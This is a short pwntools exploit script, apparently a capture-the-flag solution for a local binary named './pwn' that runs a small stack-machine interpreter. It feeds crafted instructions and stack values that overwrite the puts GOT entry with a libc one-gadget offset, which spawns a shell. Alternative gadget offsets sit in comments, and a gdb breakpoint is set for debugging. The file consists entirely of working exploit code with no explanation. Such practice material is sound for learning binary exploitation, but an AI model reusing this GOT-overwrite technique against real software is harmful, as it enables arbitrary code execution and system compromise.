#!/usr/bin/env python
from pwn import *
context(log_level='debug',arch='amd64')
p=process('./pwn')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def debugf(payload=''):
    gdb.attach(p,payload)
debugf('nb 401B62')

ru('name:\n')
name='name'+'\n'
sd(name)

ru(':\n')
ins='push push push save push add' 
sd(ins+'\n')

ru(':\n')
idx=0
puts_got=0x404020

# one_off=0x45216
# one_off=0x4526a
# one_off=0xf02a4
one_off=0xf1147
puts_off=0x6f690

stack_data='1 '+str(puts_got)+' '+str(-5+2-1)+' '+str(one_off-puts_off)+'\n'
sd(stack_data)



p.interactive()